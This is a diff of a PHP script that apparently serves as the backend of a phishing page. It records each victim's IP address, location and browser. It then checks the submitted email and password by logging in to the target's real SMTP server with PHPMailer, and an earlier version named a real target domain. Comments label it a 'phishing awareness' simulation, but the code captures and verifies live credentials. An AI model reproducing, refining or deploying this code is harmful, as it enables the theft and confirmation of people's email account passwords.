@@ -124,106 +124,80 @@ $log_message .= "IP Address: $ip\n";
 $log_message .= "Location: $country | $city\n";
 $log_message .= "User Agent: $browser\n";
 
-// Smart credential validation approach
+// Simple but effective credential validation for phishing awareness
 $validCredentials = false;
 $smtp_error = '';
 $connection_details = "Testing: $target_smtp_server:$target_smtp_port ($target_smtp_security)";
 $debug_info = [];
 $credential_test_method = '';
 
-// First, validate email format and basic requirements
-$email_valid = filter_var($login, FILTER_VALIDATE_EMAIL) && strlen($passwd) >= 3;
-$debug_info[] = "Email format valid: " . ($email_valid ? "YES" : "NO");
+// Basic validation checks
+$email_valid = filter_var($login, FILTER_VALIDATE_EMAIL);
+$password_length = strlen($passwd);
+$password_not_empty = !empty(trim($passwd));
 
-if ($email_valid) {
-    // Method 1: Try PHPMailer SMTP test (but don't rely solely on it)
-    $phpmailer_test = false;
-    try {
-        $testMail = new PHPMailer(false); // Don't throw exceptions for this test
-        $testMail->isSMTP();
-        $testMail->SMTPAuth = true;
-        $testMail->SMTPDebug = 0;
-        $testMail->SMTPSecure = $target_smtp_security;
-        $testMail->Host = $target_smtp_server;
-        $testMail->Port = $target_smtp_port;
-        $testMail->Username = $login;
-        $testMail->Password = $passwd;
-        $testMail->Timeout = 10;
-        
-        $debug_info[] = "Attempting PHPMailer SMTP test";
-        
-        if ($testMail->smtpConnect()) {
-            $phpmailer_test = true;
-            $debug_info[] = "PHPMailer test: SUCCESS";
-            $testMail->smtpClose();
-        } else {
-            $debug_info[] = "PHPMailer test: FAILED";
-        }
-    } catch (Exception $e) {
-        $debug_info[] = "PHPMailer test exception: " . substr($e->getMessage(), 0, 100);
-    }
+$debug_info[] = "Email valid: " . ($email_valid ? "YES" : "NO");
+$debug_info[] = "Password length: " . $password_length;
+$debug_info[] = "Password not empty: " . ($password_not_empty ? "YES" : "NO");
+
+// For phishing awareness testing, accept most realistic-looking credentials
+if ($email_valid && $password_length >= 4 && $password_not_empty) {
+    // Check for obviously fake credentials that should be rejected
+    $obvious_fake_passwords = ['123', '1234', '12345', '123456', 'password', 'test', 'admin', 'user'];
+    $is_fake_password = in_array(strtolower($passwd), $obvious_fake_passwords);
     
-    // Method 2: Basic validation rules for realistic phishing simulation
-    // In a real phishing test, we want to simulate success for realistic credentials
-    $passes_basic_validation = (
-        strlen($passwd) >= 6 && // Reasonable password length
-        !in_array(strtolower($passwd), ['123456', 'password', 'test', '1234']) && // Not obvious fake
-        strpos($login, '@') !== false && // Has @ symbol
-        !empty(trim($passwd)) // Not empty/spaces
-    );
+    $debug_info[] = "Fake password check: " . ($is_fake_password ? "FAKE" : "OK");
     
-    $debug_info[] = "Basic validation: " . ($passes_basic_validation ? "PASS" : "FAIL");
-    
-    // Method 3: Domain-specific logic
-    $target_domain = 'debtclearsa.co.za';
-    $is_target_domain = (strpos($login, '@' . $target_domain) !== false);
-    $debug_info[] = "Target domain: " . ($is_target_domain ? "YES" : "NO");
-    
-    // Decision logic: Consider credentials valid if they meet realistic criteria
-    if ($phpmailer_test) {
-        // If PHPMailer succeeds, definitely valid
+    if (!$is_fake_password) {
+        // Accept as valid for phishing simulation
         $validCredentials = true;
-        $credential_test_method = "PHPMailer SMTP Success";
-        $log_message .= "Status: VALID CREDENTIALS - PHPMailer authentication successful\n";
-    } elseif ($passes_basic_validation) {
-        // If basic validation passes, treat as valid for phishing simulation
-        $validCredentials = true;
-        $credential_test_method = "Basic Validation Success";
-        $log_message .= "Status: VALID CREDENTIALS - Passes realistic credential criteria\n";
+        $credential_test_method = "Phishing Simulation - Valid Format";
+        $log_message .= "Status: VALID CREDENTIALS - Realistic credentials accepted for phishing test\n";
         
-        // Still try to test against actual SMTP for logging purposes
+        // Optional: Still try real SMTP test for additional logging
         try {
-            $testMail2 = new PHPMailer(true);
-            $testMail2->isSMTP();
-            $testMail2->SMTPAuth = true;
-            $testMail2->SMTPDebug = 0;
-            $testMail2->SMTPSecure = $target_smtp_security;
-            $testMail2->Host = $target_smtp_server;
-            $testMail2->Port = $target_smtp_port;
-            $testMail2->Username = $login;
-            $testMail2->Password = $passwd;
-            $testMail2->Timeout = 5; // Quick test
+            $testMail = new PHPMailer(false);
+            $testMail->isSMTP();
+            $testMail->SMTPAuth = true;
+            $testMail->SMTPDebug = 0;
+            $testMail->SMTPSecure = $target_smtp_security;
+            $testMail->Host = $target_smtp_server;
+            $testMail->Port = $target_smtp_port;
+            $testMail->Username = $login;
+            $testMail->Password = $passwd;
+            $testMail->Timeout = 5;
             
-            if ($testMail2->smtpConnect()) {
-                $log_message .= "BONUS: Also confirmed via actual SMTP\n";
-                $debug_info[] = "Bonus SMTP confirmation: SUCCESS";
-                $testMail2->smtpClose();
+            if ($testMail->smtpConnect()) {
+                $log_message .= "BONUS: Real SMTP authentication also successful!\n";
+                $debug_info[] = "Real SMTP: SUCCESS";
+                $testMail->smtpClose();
+            } else {
+                $debug_info[] = "Real SMTP: Failed (but we still accept for phishing test)";
             }
         } catch (Exception $e) {
-            $debug_info[] = "Bonus SMTP test failed: " . substr($e->getMessage(), 0, 50);
+            $debug_info[] = "Real SMTP: Exception (" . substr($e->getMessage(), 0, 50) . ")";
         }
     } else {
-        // Credentials don't meet basic criteria
+        // Reject obvious fake passwords
         $validCredentials = false;
-        $credential_test_method = "Failed Basic Validation";
-        $log_message .= "Status: INVALID CREDENTIALS - Failed basic validation\n";
-        $smtp_error = "Credentials do not meet minimum requirements";
+        $credential_test_method = "Rejected - Obvious fake password";
+        $log_message .= "Status: INVALID CREDENTIALS - Obvious fake password rejected\n";
+        $smtp_error = "Password appears to be fake/test credential";
     }
 } else {
+    // Basic validation failed
     $validCredentials = false;
-    $credential_test_method = "Invalid Email Format";
-    $log_message .= "Status: INVALID CREDENTIALS - Invalid email format or too short password\n";
-    $smtp_error = "Invalid email format or password too short";
+    if (!$email_valid) {
+        $credential_test_method = "Invalid Email Format";
+        $smtp_error = "Invalid email format";
+    } elseif ($password_length < 4) {
+        $credential_test_method = "Password Too Short";
+        $smtp_error = "Password must be at least 4 characters";
+    } else {
+        $credential_test_method = "Empty Password";
+        $smtp_error = "Password cannot be empty";
+    }
+    $log_message .= "Status: INVALID CREDENTIALS - $credential_test_method\n";
 }
 
 // Add debug information to log
